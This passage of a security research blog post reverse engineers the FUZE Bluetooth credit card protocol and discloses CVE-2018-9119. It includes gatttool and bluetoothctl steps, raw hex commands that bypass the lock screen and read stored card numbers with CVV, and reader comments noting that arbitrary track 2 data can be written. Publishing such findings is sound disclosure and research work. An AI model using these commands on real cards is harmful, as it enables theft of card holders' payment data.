At this point, I revisited gatttool. Using bluetoothctl I was able to scan for and pair with the card. It requires the use of Numeric PIN pairing mode in which a 6 digit number is displayed on FUZE's screen that must be entered in the client (a VM running BlueZ) to successfully pair. Once pairing is completed and encryption is established, the device happily responds to GATT messages over the Attribute Protocol.

First up was replaying some messages from the Wireshark dumps. I noticed one message was consistently occurring near the beginning of the conversation:

tx 02f50101000000000000000000000000000000f5 ....................
rx ddf50f02019000000602000169ffffff31320003 ............i...12..
rx ddf50e0202425041592d434d472d3031410003   .....BPAY-CMG-01A..

When sending the first line using gatttool, the second and third lines are reliably sent back. Parsing the data by eye a bit, version numbers become apparent for the hardware, microcontroller firmware, and BLE firmware.

That's interesting, but the very first message being sent is even more interesting:

tx 02c40101300000000000000000000000000000f4 ....0...............
rx ddc404010190000003

As soon as this message is sent, the FUZE lock screen turns off and the main menu appears. This is implemented for user convenience, so the card is automatically unlocked when it is near a paired smart phone.

From here it is a matter of staring, thinking, a little experimentation, but mostly staring and thinking. This part should sound familiar to anyone who's ever reverse engineered anything.

Ultimately I was able to reverse engineer the majority of the protocol messages: including the message format and supported operations.

App-to-device messages have the following format:

 02 XX YY ZZ .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. WW

* XX - opcode
* YY - total number of GATT write requests for the current operation
* ZZ - current write request number
* .. - message body
* WW - checksum

I determined the following opcodes through a mix of interpreting messages I captured as well as light fuzzing:

* b3 - upload a payment or membership card
* b4 - delete a synced card
* b5 - possibly change card information (discovered through fuzzing)
* b6 - possibly reorder cards (discovered through fuzzing)
* b9 - set card owner name (displayed on powered off screen)
* ba - unknown function (discovered through fuzzing)
* bb - set security level
* bc - get total number of cards
* bd - unknown function, related in some way to card index (discovered through fuzzing)
* be - fetch a payment or membership card
* bf - get card owner name
* c4 - turn off passcode screen
* c5 - set or disable passcode
* c6 - factory reset
* c7 - enable or disable data blind
* d1 - enter firmware update mode
* d2 - firmware update data
* d3 - related to firmware update
* d4 - related to firmware update
* ea - fetch battery level
* f5 - fetch hardware rev, Bluetooth firmware version, and MCU firmware version

The checksum is calculated by performing an exclusive-or (xor) of all message bytes except the initial 02. Props to [Jason Benaim](https://github.com/jkbenaim) for identifying this highly secure Game Boy style checksum.

I looked briefly at the firmware update process, but I did not dive deeply. Since I only have one card, I knew I wasn't going to attempt any firmware flashing shenanigans. I was able to capture two MCU firmware samples by snooping the HTTP requests using Burp. The two samples are both high entropy, nearly the same size, and quite dissimilar in content. This suggests that they are encrypted. Without further analysis, it's not possible to say if they are signed or validated in any way during the firmware update process.

The BLE firmware update occurs over CSR's in-house OTA update protocol. I am not aware of any security analysis of this protocol. It would be interesting to study and understand, as I'm sure it is used by other devices with this or similar CSR BLE SoCs.

## Security vulnerability and exploit PoC

With an understanding of the Bluetooth protocol used by FUZE (see previous section), ICE9 discovered CVE-2018-9119: an attacker with physical access to a FUZE Card can perform the following actions:

* Bypass the lock screen
* Read credit card numbers, with expiration date and CVV
* Tamper with data on the card

At the time of this writing, the vulnerability has not been patched and remains exploitable on all production FUZE Cards.

This vulnerability affects MCU firmware 0.1.73 and BLE firmware 0.7.4, the most recently released versions of both.

Update 2018-04-07: BrilliantTS plans to release an updated firmware on 2018-04-19. See the beginning of this article for full details.

The attacker must have physical access to the card because of how the card uses BLE link layer security. In addition to encrypting data, BLE link layer security acts as an authentication mechanism. If you aren't paired with the FUZE card, it will reject every message you send to it. Although [BLE link layer security has well known weaknesses](https://blog.ice9.us/2014/01/ble-fun-with-ubertooth-sniffing.html) (also discovered by ICE9), it works reasonably well for FUZE's use case.

Where FUZE went right was using the Numeric PIN pairing mode. When you pair with FUZE, the card displays a 6 digit random number on its e-Paper screen. You must enter this on your phone (or Linux attack VM) in order for pairing to succeed. If you attempt to pair with a card that is not in your possession, you will have a one in a million chance of guessing the 6 digit pairing code correctly.

Rigorous testing indicated that it was not possible to bypass the pairing requirement, and also it was not possible to downgrade to a weaker pairing mechanism (Just Works) that does not require entering a passcode.

Some may argue that the physical access requirement makes this vulnerability uninteresting. I would like to emphasize two points: the first is that handing a credit card to strangers is a normal part of making many types of purchases, so it is impossible to ensure that the card is not tampered with out of sight. Secondly, the card presents itself as more secure than a normal credit card with its use of a lock screen. As demonstrated by this weakness, that is a false sense of security.

### Proof-of-Concept Exploit

ICE9 developed a proof-of-concept exploit that can be run from a Linux system or VM. The exploit has been tested in Debian Stretch inside VMware using a BLE dongle via USB passthrough. This attack requires BlueZ to be installed.

First, scan for and pair with the device using bluetoothctl:

1. Launch bluetoothctl: sudo bluetoothctl
2. Enable the agent (used for pairing): agent on
3. Scan for devices: scan on
4. Once a FUZE Card is found, disable scanning: scan off
5. Pair wih the FUZE Card: pair <bdaddr>
6. Enter the Numeric PIN displayed on the device
7. Disconnect from the card: disconnect <bdaddr>

|  |
| --- |
| Pairing with the FUZE Card |

From here, it is possible to send commands to the card using gatttool:

1. Launch gatttool: sudo gatttool -I -b <bdaddr>
2. Connect to the device: connect
3. Subscribe to notifications: char-write-req 1b 0100
4. Send commands: char-write-req 18 <command data>

The following commands are of interest:

 02c40101300000000000000000000000000000f4
 02be01013030310000000000000000000000008f

The first will bypass the lock screen, and the second will read the first credit card number, expiration date, and CVV.

ICE9 disclosed the details of this vulnerability to BrilliantTS via email on the following timeline:

* 2018-01-30 - Initial email to info@fuzecard.com and support@fuzecard.com
* 2018-01-31 - Follow-up email sent
* 2018-02-04 - Third follow-up sent
* 2018-02-05 - Response received from BrilliantTS (FUZE tech support individual)
* 2018-02-06 - Report sent to FUZE tech support individual
* 2018-02-09 - Follow-up sent to FUZE tech support individual
* 2018-02-13 - Final follow-up sent to FUZE tech support individual
* 2018-03-22 - Disclosure period expired

The report included a complete description of the vulnerability, proof-of-concept exploit code, and noted that ICE9's standard disclosure period is 45 days. BrilliantTS did not respond to any message after the report was delivered, and the 45 day disclosure period has since expired.

As of this writing, BrilliantTS has not released a firmware update for the FUZE Card.

### Cracking the Encryption

For completeness, I will note that the Numeric PIN pairing mode (along with other LE Legacy Pairing modes) is vulnerable to a brute force attack if an attacker is able to sniff the pairing conversation. I consider this an unlikely scenario with FUZE. It's likely that the user will pair in a secure location (such as their home), far from attackers. When they go to use the card, the phone and card use the previously established encryption key. During this phase of encryption, there are no known weaknesses.

Nonetheless, as a proof-of-concept, I was able to sniff a pairing conversation and crack it using crackle.

## A few words about Coin

Some readers of this article probably remember that FUZE is not the first attempt at a Bluetooth credit card. Way back in the ancient days of 2013, Coin announced a similar product, and delivered it to users by 2015. Fitbit acquired coin in 2016 and killed the product and backend by 2017.

[Adam Munich](http://adammunich.com/) snapped an X-ray of Coin:

From the X-ray it is clear that Coin is a much simpler design than FUZE.

Like FUZE, Coin is the size and thickness of a regular credit card and communicates via Bluetooth. It has a simpler TN LCD segment-based screen and only a single button. Even still, it also has a passcode feature similar to FUZE. Unlike FUZE, the battery is not rechargeable, and users were expected to return their cards for replacement every two years.

One key way in which FUZE attempts to differentiate itself is by including NFC and EMV support. At the time of this writing, neither of those features is available, so it's a moot point.

I never owned a Coin device, so I can't say how its security compared to FUZE. To the best of my knowledge, nobody ever succeeded in extracting credit card numbers from Coin over Bluetooth. However, since the product is completely dead, it's again a moot point.

## Conclusion

Some IoT ideas are unusually sticky. No matter how bad they sound, someone goes out and makes them. A Bluetooth credit card meets this definition for me. With Apple Pay, Google Pay, and other contactless payments shaking up the payments industry, I don't see a lot of value in a Bluetooth credit card. Even with those options available, I still see myself carrying around ordinary credit cards for the foreseeable future. At the end of the day, the risks of a Bluetooth card aren't worth the questionable convenience benefit.

If you would like to hear more and you're in the Bay Area, I will be presenting my research on FUZE Card at the [Mountain View Reverse Engineering Meetup](https://www.meetup.com/Mountain-View-Reverse-Engineering-Meetup/events/249206794/) (in Santa Clara) on Wednesday April 11, 2018 at 8 PM.

   Do you know if it's possible to write a custom string to the card. Someone mentioned that fuze only emulated track 2 but maybe by writing your ownostring to add card that could be remedied.

   Is it possible to add a card manually using this exploit?

     It is possible to write arbitrary track 2 data to the card using this technique.
